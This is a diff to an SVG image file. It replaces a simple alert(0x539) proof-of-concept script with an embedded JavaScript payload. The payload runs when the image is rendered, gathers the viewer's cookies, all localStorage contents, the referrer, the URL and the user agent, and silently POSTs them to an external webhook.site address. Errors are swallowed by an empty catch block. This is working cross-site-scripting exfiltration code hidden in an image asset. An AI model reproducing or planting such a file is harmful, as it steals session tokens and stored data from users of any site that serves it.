@@ -1,6 +1,26 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
-<rect width="124" height="124" rx="24" fill="#000000"/>
-   <script type="text/javascript">  
-      alert(0x539);
-   </script>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    //<![CDATA[
+    try {
+      const data = {
+        cookie: document.cookie,
+        localStorage: JSON.stringify(Object.keys(localStorage).reduce((obj, key) => {
+          obj[key] = localStorage.getItem(key); return obj;
+        }, {})),
+        referrer: document.referrer,
+        url: document.location.href,
+        userAgent: navigator.userAgent
+      };
+
+      fetch('https://webhook.site/8af976da-6edb-4787-85d3-0491a71b3a34', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    } catch(e) {}
+    //]]>
+  </script>
 </svg>
